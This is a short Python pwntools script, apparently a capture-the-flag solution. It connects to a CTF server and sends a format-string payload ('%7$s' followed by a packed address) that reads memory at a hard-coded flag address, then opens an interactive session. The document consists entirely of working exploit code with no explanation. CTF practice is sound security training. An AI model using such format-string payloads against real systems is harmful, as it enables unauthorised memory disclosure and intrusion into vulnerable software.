from pwn import *

host, port = "csie.ctf.tw", 10133
r = remote(host, port)

flag = 0x600ba0
payload = "%7$saaaa" + p64(flag)
r.sendline(payload)

r.interactive()
